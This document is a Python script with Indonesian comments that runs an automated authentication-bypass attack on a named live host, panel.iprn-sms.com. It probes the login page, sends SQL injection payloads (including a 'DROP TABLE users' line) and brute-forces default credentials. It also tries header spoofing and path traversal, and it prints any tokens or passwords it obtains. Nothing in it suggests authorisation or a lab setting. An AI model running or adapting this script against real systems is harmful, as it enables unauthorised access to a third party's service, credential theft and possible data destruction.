import requests
import json
import time
from bs4 import BeautifulSoup
import re

class IPRNBypassAttack:
    def __init__(self):
        self.base_url = "https://panel.iprn-sms.com"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
    def reconnaissance(self):
        """Fase 1: Reconnaissance - ambil info dari halaman login"""
        print("[*] FASE 1: RECONNAISSANCE")
        print("[*] Mengakses halaman login...")
        
        try:
            r = self.session.get(f'{self.base_url}/login', timeout=15)
            print(f"[+] Status Code: {r.status_code}")
            print(f"[+] Response Length: {len(r.text)} bytes")
            
            # Parse HTML untuk cari form fields dan hidden inputs
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Cari form login
            forms = soup.find_all('form')
            print(f"[+] Found {len(forms)} form(s)")
            
            for i, form in enumerate(forms):
                print(f"\n[*] Form {i+1} details:")
                print(f"    Action: {form.get('action')}")
                print(f"    Method: {form.get('method')}")
                
                inputs = form.find_all('input')
                for inp in inputs:
                    print(f"    Input: name={inp.get('name')}, type={inp.get('type')}, value={inp.get('value')}")
            
            # Cari JavaScript endpoints
            scripts = soup.find_all('script')
            api_endpoints = []
            for script in scripts:
                if script.string:
                    # Cari URL patterns dalam JS
                    urls = re.findall(r'["\']/(api/[^"\']+)["\']', script.string)
                    api_endpoints.extend(urls)
            
            if api_endpoints:
                print(f"\n[+] Found API endpoints in JS:")
                for endpoint in set(api_endpoints):
                    print(f"    {endpoint}")
            
            return r
            
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def test_sql_injection_advanced(self):
        """Fase 2: SQL Injection dengan payloads advanced"""
        print("\n[*] FASE 2: SQL INJECTION ATTACK")
        
        # Payloads SQLi advanced untuk berbagai database
        payloads = [
            # MySQL
            {"username": "admin' OR '1'='1' -- ", "password": "x"},
            {"username": "admin'--", "password": "x"},
            {"username": "admin' #", "password": "x"},
            {"username": "' OR 1=1 LIMIT 1 -- ", "password": "x"},
            {"username": "admin' AND 1=0 UNION ALL SELECT 'admin', 'admin' -- ", "password": "x"},
            
            # PostgreSQL
            {"username": "admin' OR '1'='1' /*", "password": "x"},
            {"username": "admin'; DROP TABLE users--", "password": "x"},
            
            # Time-based blind SQLi
            {"username": "admin' AND SLEEP(5)--", "password": "x"},
            {"username": "admin' OR IF(1=1, SLEEP(5), 0)--", "password": "x"},
            
            # Boolean-based
            {"username": "admin' AND '1'='1", "password": "x"},
            {"username": "admin' AND '1'='2", "password": "x"},
        ]
        
        endpoints = ['/api/login', '/login', '/api/auth', '/auth/login', '/api/v1/login']
        
        for endpoint in endpoints:
            print(f"\n[*] Testing endpoint: {endpoint}")
            
            for payload in payloads:
                try:
                    url = f"{self.base_url}{endpoint}"
                    
                    # Test sebagai JSON
                    r = self.session.post(url, json=payload, timeout=15)
                    
                    print(f"  [+] Payload: {payload['username'][:50]}")
                    print(f"      Status: {r.status_code}, Length: {len(r.text)}")
                    
                    # Deteksi success indicators
                    success_indicators = ['token', 'session', 'dashboard', 'welcome', 'success', 'admin', 'authenticated']
                    
                    if r.status_code == 200:
                        response_lower = r.text.lower()
                        
                        if any(indicator in response_lower for indicator in success_indicators):
                            print(f"      [SUCCESS] Potential bypass detected!")
                            print(f"      Response: {r.text[:500]}")
                            
                            try:
                                json_data = r.json()
                                if 'token' in json_data or 'user' in json_data:
                                    print(f"\n[!!!] BYPASS BERHASIL [!!!]")
                                    print(json.dumps(json_data, indent=2))
                                    return json_data
                            except:
                                pass
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    pass
        
        return None
    
    def test_default_and_common_creds(self):
        """Fase 3: Test credentials default dan common"""
        print("\n[*] FASE 3: DEFAULT & COMMON CREDENTIALS ATTACK")
        
        credentials = [
            # Default umum
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("admin", "Admin@123"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("root", "toor"),
            
            # Common untuk SMS panel
            ("admin", "sms123"),
            ("admin", "smspanel"),
            ("smsadmin", "admin"),
            ("owner", "owner"),
            ("superadmin", "superadmin"),
            
            # Weak passwords
            ("admin", "123456"),
            ("admin", "12345678"),
            ("admin", "qwerty"),
            ("admin", "letmein"),
            
            # Panel specific
            ("admin", "iprn123"),
            ("admin", "panel123"),
            ("iprn", "iprn"),
        ]
        
        endpoints = ['/api/login', '/login', '/api/auth']
        
        for endpoint in endpoints:
            print(f"\n[*] Testing endpoint: {endpoint}")
            
            for username, password in credentials:
                try:
                    # Test JSON format
                    payload_json = {"username": username, "password": password}
                    r = self.session.post(f"{self.base_url}{endpoint}", json=payload_json, timeout=10)
                    
                    print(f"  [+] {username}:{password} - Status: {r.status_code}")
                    
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if 'token' in data or data.get('success') or 'user' in data:
                                print(f"\n[!!!] CREDENTIALS VALID [!!!]")
                                print(f"Username: {username}")
                                print(f"Password: {password}")
                                print(f"Response: {json.dumps(data, indent=2)}")
                                return (username, password, data)
                        except:
                            if 'dashboard' in r.text.lower() or 'welcome' in r.text.lower():
                                print(f"\n[!!!] CREDENTIALS VALID [!!!]")
                                print(f"Username: {username}")
                                print(f"Password: {password}")
                                return (username, password, r.text)
                    
                    # Test form data format
                    payload_form = {"username": username, "password": password}
                    r2 = self.session.post(f"{self.base_url}{endpoint}", data=payload_form, timeout=10)
                    
                    if r2.status_code == 200 and r2.status_code != r.status_code:
                        print(f"      [*] Different response with form data: {r2.status_code}")
                        try:
                            data = r2.json()
                            if 'token' in data or data.get('success'):
                                print(f"\n[!!!] CREDENTIALS VALID (FORM DATA) [!!!]")
                                return (username, password, data)
                        except:
                            pass
                    
                    time.sleep(0.3)
                    
                except Exception as e:
                    print(f"      Error: {e}")
        
        return None
    
    def test_auth_bypass_techniques(self):
        """Fase 4: Teknik bypass authentication lainnya"""
        print("\n[*] FASE 4: AUTHENTICATION BYPASS TECHNIQUES")
        
        # Test 1: Header manipulation
        print("\n[*] Testing header manipulation...")
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin base64
        ]
        
        admin_endpoints = ['/admin', '/dashboard', '/panel', '/api/users', '/api/admin']
        
        for endpoint in admin_endpoints:
            for headers in bypass_headers:
                try:
                    test_headers = self.session.headers.copy()
                    test_headers.update(headers)
                    
                    r = requests.get(f'{self.base_url}{endpoint}', headers=test_headers, timeout=10)
                    
                    if r.status_code == 200 and len(r.text) > 500:
                        print(f"  [+] Accessible: {endpoint}")
                        print(f"      Headers: {headers}")
                        print(f"      Preview: {r.text[:200]}")
                        return r.text
                except:
                    pass
        
        # Test 2: Path traversal
        print("\n[*] Testing path traversal...")
        traversal_paths = [
            '/api/../admin',
            '/api/login/../admin',
            '/%2e%2e/admin',
            '/api/..;/admin',
        ]
        
        for path in traversal_paths:
            try:
                r = self.session.get(f'{self.base_url}{path}', timeout=10)
                if r.status_code == 200:
                    print(f"  [+] Accessible: {path}")
                    return r.text
            except:
                pass
        
        return None
    
    def run_full_attack(self):
        """Jalankan semua fase serangan"""
        print("=" * 70)
        print("  IPRN-SMS PANEL AUTHENTICATION BYPASS")
        print("  Target: https://panel.iprn-sms.com")
        print("  Time: 2026-09-03 17:52 UTC")
        print("=" * 70)
        
        # Fase 1: Recon
        self.reconnaissance()
        
        # Fase 2: SQLi
        result = self.test_sql_injection_advanced()
        if result:
            return result
        
        # Fase 3: Default creds
        result = self.test_default_and_common_creds()
        if result:
            return result
        
        # Fase 4: Bypass techniques
        result = self.test_auth_bypass_techniques()
        if result:
            return result
        
        print("\n[!] Semua teknik bypass gagal.")
        print("[*] Kemungkinan penyebab:")
        print("    - Login endpoint menggunakan CAPTCHA")
        print("    - Rate limiting aktif")
        print("    - 2FA enabled")
        print("    - WAF/IPS protection aktif")
        
        return None


if __name__ == "__main__":
    attacker = IPRNBypassAttack()
    result = attacker.run_full_attack()
    
    if result:
        print("\n" + "=" * 70)
        print("  [SUCCESS] BYPASS BERHASIL!")
        print("=" * 70)
        
        if isinstance(result, tuple):
            print(f"\nUsername: {result[0]}")
            print(f"Password: {result[1]}")
            print(f"\nResponse Data:")
            print(json.dumps(result[2] if isinstance(result[2], dict) else str(result[2])[:500], indent=2))
        else:
            print(json.dumps(result if isinstance(result, dict) else str(result)[:500], indent=2))
